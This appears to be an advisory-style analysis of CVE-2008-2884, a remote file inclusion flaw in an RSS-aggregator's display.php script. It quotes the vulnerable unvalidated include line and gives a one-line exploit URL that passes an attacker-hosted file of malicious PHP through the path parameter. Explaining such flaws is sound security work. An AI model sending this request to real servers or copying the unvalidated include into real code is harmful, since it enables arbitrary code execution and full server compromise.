Based on the provided information, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2008-2884

**Root Cause of Vulnerability:**
The vulnerability is due to a lack of proper input sanitization in the `display.php` script of the RSS-aggregator application. Specifically, the script uses a user-supplied `path` parameter without validation when including the `config.php` file.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The application is vulnerable to RFI, allowing an attacker to include a remote file into the application's execution flow. The vulnerable code is:
```php
include_once($path.'/admin/fonctions/config.php');
```
where `$path` is directly derived from user-controlled input.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious remote file, an attacker can execute arbitrary PHP code on the server, leading to complete system compromise.
- **Data Breach:** Depending on the malicious file, attackers could access, modify, or delete sensitive data stored on the server.
- **Website Defacement:** Attackers could alter the content of the website.
- **Denial of Service (DoS):** The attacker may be able to cause a DoS by overloading the server with malicious code execution.

**Attack Vectors:**
- **HTTP GET Parameter:** The attacker exploits the vulnerability by manipulating the `path` parameter in the URL when accessing `display.php`.
- **Network:** The attack is performed over the network.

**Required Attacker Capabilities/Position:**
- **Network Connectivity:** The attacker must be able to access the vulnerable server over the network.
- **Basic Understanding of Web Application Exploitation:** The attacker needs to know how to manipulate URL parameters to exploit the RFI vulnerability.

**Exploit Example:**

```
http://xxxx/[Path]/display.php?path=[EVIL]
```

Where `[Path]` is the relative path to the `display.php` script, and `[EVIL]` is the URL of the attacker-controlled remote file containing malicious PHP code.
